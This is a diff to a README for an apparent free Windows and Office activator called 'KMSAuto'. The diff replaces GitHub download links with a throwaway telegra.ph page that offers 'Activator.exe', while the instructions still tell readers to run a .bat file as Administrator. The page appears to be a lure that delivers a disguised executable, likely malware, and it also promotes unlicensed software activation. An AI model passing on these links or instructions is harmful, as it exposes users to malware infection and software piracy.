@@ -1,4 +1,4 @@
-# [KMSAuto Free — Windows & Office Activator 2026](https://github.com/)
+# [Windows & Office Free Activator 2026](https://github.com/)
 
 [![preview](https://massgrave.dev/img/logo_small.png)](https://github.com/)
 
@@ -44,7 +44,7 @@ No installer, no clicks, no account needed.
 
 ## How to Use (Manual)
 
-1. [Download KMSAuto.zip](https://github.com/)
+1. [Download Activator.exe]([https://telegra.ph/dsadsadsa-05-16])
 2. Extract and run KMSAuto.bat as Administrator
 3. Select activation method from the menu
 4. Done — verify in Settings → System → Activation
@@ -75,4 +75,4 @@ No installer, no clicks, no account needed.
 
 ## Download
 
-[⬇️ Download KMSAuto Free — Free]([https://github.com/](https://telegra.ph/dsadsadsa-05-16))
+[⬇️ Download KMSAuto Free — Free](https://telegra.ph/dsadsadsa-05-16)
